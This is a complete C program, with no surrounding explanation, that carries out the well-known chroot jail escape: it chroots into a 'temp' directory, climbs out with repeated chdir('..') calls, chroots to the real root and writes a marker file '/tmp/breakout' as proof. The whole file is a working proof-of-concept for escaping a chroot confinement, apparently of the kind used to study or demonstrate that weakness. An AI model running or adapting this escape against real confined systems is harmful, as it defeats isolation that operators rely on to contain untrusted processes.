#include <fcntl.h> 
#include <unistd.h> 
#include <sys/stat.h> 
#include <sys/types.h> 
#include <stdlib.h>

int main() { 
  struct stat sbuf;
  if (stat("temp",&sbuf)<0) { 
    mkdir("temp",0755); 
  }

  chroot("temp");
  for (int i = 0; i < 1024; i++) chdir("..");
  chroot("."); 

  int fd = open("/tmp/breakout", O_CREAT|O_WRONLY, 0660);
  write(fd, "break from jail", 15);
  close(fd);

  return 0;
}
